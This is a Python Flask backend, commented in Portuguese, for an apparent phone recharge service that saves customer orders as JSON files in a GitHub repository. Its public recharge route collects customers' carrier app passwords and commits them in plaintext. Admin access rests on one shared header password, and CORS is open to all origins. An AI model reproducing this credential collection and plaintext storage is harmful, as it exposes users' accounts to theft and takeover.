import os
import requests
import json
import base64
import time
from flask import Flask, request, jsonify
from flask_cors import CORS
from functools import wraps
from datetime import datetime
import pytz

# --- INICIALIZAÇÃO E CONFIGURAÇÃO DA APLICAÇÃO ---
app = Flask(__name__)
CORS(app)

# --- LEITURA DAS VARIÁVEIS DE AMBIENTE ---
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
GITHUB_REPO = os.environ.get('GITHUB_REPO')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD')

VALID_OPERATORS = ['tim', 'vivo', 'claro']

# --- FUNÇÕES DE INTERAÇÃO COM O GITHUB ---

def get_github_file(filename):
    """Busca e decodifica um arquivo específico do GitHub."""
    api_url = f'https://api.github.com/repos/{GITHUB_REPO}/contents/{filename}'
    headers = {'Authorization': f'token {GITHUB_TOKEN}', 'Accept': 'application/vnd.github.v3+json'}
    res = requests.get(api_url, headers=headers)
    if res.status_code == 404:
        return None, None
    res.raise_for_status()
    data = res.json()
    content = base64.b64decode(data['content']).decode('utf-8')
    sha = data['sha']
    return json.loads(content) if content else {}, sha

def save_github_file(filename, data_dict, sha, commit_message):
    """Cria ou atualiza um arquivo específico no GitHub."""
    api_url = f'https://api.github.com/repos/{GITHUB_REPO}/contents/{filename}'
    headers = {'Authorization': f'token {GITHUB_TOKEN}', 'Accept': 'application/vnd.github.v3+json'}
    content_bytes = json.dumps(data_dict, indent=2, ensure_ascii=False).encode('utf-8')
    content_base64 = base64.b64encode(content_bytes).decode('utf-8')
    payload = { 'message': commit_message, 'content': content_base64 }
    if sha:
        payload['sha'] = sha
    res = requests.put(api_url, headers=headers, json=payload)
    res.raise_for_status()

# --- FUNÇÃO DE AUTENTICAÇÃO DO ADMIN ---
def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_password = request.headers.get('Authorization')
        if not auth_password or auth_password != ADMIN_PASSWORD:
            return jsonify({'message': 'Acesso negado.'}), 401
        return f(*args, **kwargs)
    return decorated_function

# --- ROTAS DA API ---

# NOVA ROTA (PÚBLICA): Fornece os dados de configuração para a página do cliente.
@app.route('/api/config', methods=['GET'])
def get_config():
    try:
        config_data, _ = get_github_file('config.json')
        if config_data is None:
            return jsonify({'message': 'Arquivo de configuração não encontrado.'}), 404
        return jsonify(config_data), 200
    except Exception as e:
        print(e)
        return jsonify({'message': 'Erro ao buscar configuração.'}), 500

# NOVA ROTA (PROTEGIDA): Salva as alterações feitas pelo admin no painel de configurações.
@app.route('/api/admin/config', methods=['PUT'])
@admin_required
def update_config():
    try:
        new_config_data = request.get_json()
        _, sha = get_github_file('config.json')
        if sha is None:
             return jsonify({'message': 'Arquivo de configuração não encontrado para atualizar.'}), 404
        
        save_github_file('config.json', new_config_data, sha, 'Admin atualizou as configurações da página')
        return jsonify({'message': 'Configurações salvas com sucesso!'}), 200
    except Exception as e:
        print(e)
        return jsonify({'message': 'Erro ao salvar as configurações.'}), 500
        
# Rota do Cliente (agora mais simples)
@app.route('/api/recarregar', methods=['POST'])
def handle_recharge():
    data = request.get_json()
    operadora = (data.get('operadora') or '').lower()
    if operadora not in VALID_OPERATORS:
        return jsonify({'message': f'Operadora inválida.'}), 400
    try:
        filename = f"recargas_{operadora}.json"
        recargas, sha = get_github_file(filename)
        if recargas is None: recargas = []
        
        novo_pedido = {
            "id": str(int(time.time() * 1000)),
            "timestamp": datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat(),
            "nome": data.get('nome'), "telefone": data.get('telefone'), "operadora": data.get('operadora'),
            "recarga_selecionada": data.get('recarga_selecionada'),
            "senha_app": data.get('senha_tim') or data.get('senha_vivo') or data.get('senha_claro'),
            "status": "Na fila de espera", "admin_comment": ""
        }
        recargas.append(novo_pedido)
        save_github_file(filename, recargas, sha, f"Adiciona recarga para {novo_pedido['nome']}")
        return jsonify({'message': 'Sua solicitação foi registrada com sucesso!'}), 201
    except Exception as e:
        print(e)
        return jsonify({'message': 'Erro no servidor.'}), 500

# Rotas de gerenciamento de pedidos (sem alterações)
@app.route('/api/admin/recargas', methods=['GET'])
@admin_required
def get_all_recargas():
    # ... (código existente)
    todos_os_pedidos = []
    for op in VALID_OPERATORS:
        filename = f"recargas_{op}.json"
        try:
            recargas, _ = get_github_file(filename)
            if recargas: todos_os_pedidos.extend(recargas)
        except Exception as e:
            print(f"Não foi possível ler o arquivo {filename}: {e}")
    todos_os_pedidos.sort(key=lambda r: r.get('timestamp', ''), reverse=True)
    return jsonify(todos_os_pedidos), 200

@app.route('/api/admin/recargas/<recarga_id>', methods=['PUT'])
@admin_required
def update_recarga(recarga_id):
    # ... (código existente)
    update_data = request.get_json()
    try:
        for op in VALID_OPERATORS:
            filename = f"recargas_{op}.json"
            recargas, sha = get_github_file(filename)
            if not recargas: continue
            index_pedido = next((i for i, r in enumerate(recargas) if r.get('id') == recarga_id), -1)
            if index_pedido != -1:
                for key, value in update_data.items():
                    if key in recargas[index_pedido]: recargas[index_pedido][key] = value
                save_github_file(filename, recargas, sha, f"Admin atualizou a recarga ID {recarga_id}")
                return jsonify({'message': 'Recarga atualizada com sucesso!', 'recarga': recargas[index_pedido]}), 200
        return jsonify({'message': 'Recarga com este ID não foi encontrada.'}), 404
    except Exception as e:
        print(e)
        return jsonify({'message': 'Falha ao atualizar a recarga no GitHub.'}), 500


@app.route('/api/admin/recargas/<recarga_id>', methods=['DELETE'])
@admin_required
def delete_recarga(recarga_id):
    # ... (código existente)
    try:
        for op in VALID_OPERATORS:
            filename = f"recargas_{op}.json"
            recargas, sha = get_github_file(filename)
            if not recargas: continue
            len_antes = len(recargas)
            recargas_atualizadas = [r for r in recargas if r.get('id') != recarga_id]
            if len(recargas_atualizadas) < len_antes:
                save_github_file(filename, recargas_atualizadas, sha, f"Admin excluiu a recarga ID {recarga_id}")
                return jsonify({'message': 'Recarga excluída com sucesso!'}), 200
        return jsonify({'message': 'Recarga com este ID não foi encontrada.'}), 404
    except Exception as e:
        print(e)
        return jsonify({'message': 'Falha ao excluir a recarga no GitHub.'}), 500